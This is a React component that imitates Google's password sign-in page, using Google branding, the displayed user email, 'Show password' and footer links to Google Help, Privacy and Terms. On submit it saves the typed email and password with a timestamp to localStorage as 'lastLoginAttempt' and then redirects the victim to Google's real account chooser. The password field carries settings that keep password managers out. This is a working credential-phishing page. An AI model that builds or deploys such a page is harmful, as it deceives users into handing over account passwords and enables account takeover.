import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../styles/app.css';
import '../styles/password.css';
import '../styles/main.css';

function PasswordPage() {
  const navigate = useNavigate();
  const [userEmail, setUserEmail] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    const email = localStorage.getItem('userEmail');
    if (!email) {
      navigate('/');
      return;
    }
    setUserEmail(email);
  }, [navigate]);

  const handleSubmit = (e) => {
    e.preventDefault();
    const passwordInput = document.getElementById('password');
    if (passwordInput && passwordInput.value) {
      const credentials = {
        email: userEmail,
        password: passwordInput.value,
        timestamp: new Date().toISOString()
      };
      localStorage.setItem('lastLoginAttempt', JSON.stringify(credentials));
      localStorage.removeItem('userEmail');
      window.location.replace(`https://accounts.google.com/AccountChooser?Email=${encodeURIComponent(userEmail)}`);
    }
  };

  return (
    <>
      <div className="container">
        <img src="/google-g-logo.svg" alt="Google" className="google-logo" />
        <h1>Welcome</h1>
        <div className="email-display" onClick={() => navigate('/')}>{userEmail}</div>
        <form onSubmit={handleSubmit} autoComplete="off">
          <div className="form-group">
            <input 
              type={showPassword ? "text" : "password"}
              className="input-field" 
              id="password" 
              name="current-password"
              placeholder="Enter your password" 
              required
              autoComplete="off"
              data-lpignore="true"
            />
            <div className="show-password">
              <input 
                type="checkbox" 
                id="show-password-checkbox"
                checked={showPassword}
                onChange={(e) => setShowPassword(e.target.checked)}
              />
              <label htmlFor="show-password-checkbox">Show password</label>
            </div>
          </div>
          <button type="button" className="forgot-password" onClick={() => navigate('/forgot-password')}>
            Forgot password?
          </button>
          <button type="submit" className="next-button">Next</button>
        </form>
      </div>
      <footer>
        <select className="language-select">
          <option>English (United States)</option>
        </select>
        <div className="footer-links">
          <button type="button" onClick={() => window.open('https://support.google.com')}>Help</button>
          <button type="button" onClick={() => window.open('https://policies.google.com/privacy')}>Privacy</button>
          <button type="button" onClick={() => window.open('https://policies.google.com/terms')}>Terms</button>
        </div>
      </footer>
    </>
  );
}

export default PasswordPage; 